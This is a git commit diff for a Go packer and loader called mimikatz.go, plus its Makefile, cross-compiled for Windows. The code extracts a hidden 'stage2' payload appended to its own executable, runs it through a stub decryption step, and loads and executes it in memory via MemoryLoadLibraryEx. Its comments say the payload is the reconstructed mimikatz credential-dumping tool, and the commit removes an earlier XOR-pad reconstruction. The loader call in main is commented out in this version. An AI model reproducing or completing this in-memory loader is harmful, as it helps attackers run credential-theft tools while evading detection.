9a7fb7a1673e3e3d014720846d101fb4fe61e9fd
@sha0coder <sha0@protonmail.com>
2017-11-23 20:38:09 +0100

    unpack ready

--- Makefile
+++ Makefile
@@ -1,4 +1,4 @@
 all:
 	CC=i586-mingw32msvc-gcc   CGO_ENABLED=1  GOOS=windows GOARCH=386 go build mimikatz.go
-linux:
+test:
 	CGO_ENABLED=0 go build mimikatz.go
--- mimikatz.go
+++ mimikatz.go
@@ -11,6 +11,7 @@ import (
 	"fmt"
 	"io/ioutil"
 	"os"
+	"unsafe"
 )
 
 const KEY string = "changethiskey"
@@ -23,50 +24,49 @@ func check(err error, msg string) {
 	}
 }
 
-func unpack(filename string) {
+func unpack(filename string) []byte {
 	fmt.Printf("Unpacking %s ...\n", filename)
 	bin, err := ioutil.ReadFile(filename)
 	check(err, "error reading file")
 	fmt.Printf("unpacked %d bytes\n", len(bin))
-	a := bin[SIZE:]
-	fmt.Printf("hidden section size: %d == %d\n", len(bin)-SIZE, len(a))
-	fmt.Println(a)
+	stage2 := bin[SIZE:]
+	fmt.Printf("hidden section size: %d == %d\n", len(bin)-SIZE, len(stage2))
+	return stage2
+}
+
+func decrypt(stage2 []byte) []byte {
+
+	return stage2
+}
+
+func ramExec(stage2 []byte) {
+	// convert the args passed to this program into a C array of C strings
+	var cArgs []*C.char
+	for _, goString := range os.Args {
+		cArgs = append(cArgs, C.CString(goString))
+	}
+
+	// load the mimikatz reconstructed binary from memory
+	handle := C.MemoryLoadLibraryEx(
+		unsafe.Pointer(&stage2[0]),                // void *data
+		(C.size_t)(len(stage2)),                   // size_t
+		(*[0]byte)(C.MemoryDefaultAlloc),          // Alloc func ptr
+		(*[0]byte)(C.MemoryDefaultFree),           // Free func ptr
+		(*[0]byte)(C.MemoryDefaultLoadLibrary),    // loadLibrary func ptr
+		(*[0]byte)(C.MemoryDefaultGetProcAddress), // getProcAddress func ptr
+		(*[0]byte)(C.MemoryDefaultFreeLibrary),    // freeLibrary func ptr
+		unsafe.Pointer(&cArgs[0]),                 // void *userdata
+	)
+
+	// run mimikatz
+	C.MemoryCallEntryPoint(handle)
+
+	// cleanup
+	C.MemoryFreeLibrary(handle)
 }
 
 func main() {
 	myself := os.Args[0]
-
-	unpack(myself)
-
-	/*
-		// XOR the pads togeather
-		var mimikatzEXE []byte
-		for index, bite := range mimikatzPad0 {
-			mimikatzEXE = append(mimikatzEXE, []byte{bite ^ mimikatzPad1[index]}...)
-		}
-
-		// convert the args passed to this program into a C array of C strings
-		var cArgs []*C.char
-		for _, goString := range os.Args {
-			cArgs = append(cArgs, C.CString(goString))
-		}
-
-		// load the mimikatz reconstructed binary from memory
-		handle := C.MemoryLoadLibraryEx(
-			unsafe.Pointer(&mimikatzEXE[0]),           // void *data
-			(C.size_t)(len(mimikatzEXE)),              // size_t
-			(*[0]byte)(C.MemoryDefaultAlloc),          // Alloc func ptr
-			(*[0]byte)(C.MemoryDefaultFree),           // Free func ptr
-			(*[0]byte)(C.MemoryDefaultLoadLibrary),    // loadLibrary func ptr
-			(*[0]byte)(C.MemoryDefaultGetProcAddress), // getProcAddress func ptr
-			(*[0]byte)(C.MemoryDefaultFreeLibrary),    // freeLibrary func ptr
-			unsafe.Pointer(&cArgs[0]),                 // void *userdata
-		)
-
-		// run mimikatz
-		C.MemoryCallEntryPoint(handle)
-
-		// cleanup
-		C.MemoryFreeLibrary(handle)
-	*/
+	stage2 := decrypt(unpack(myself))
+	//ramExec(stage2)
 }
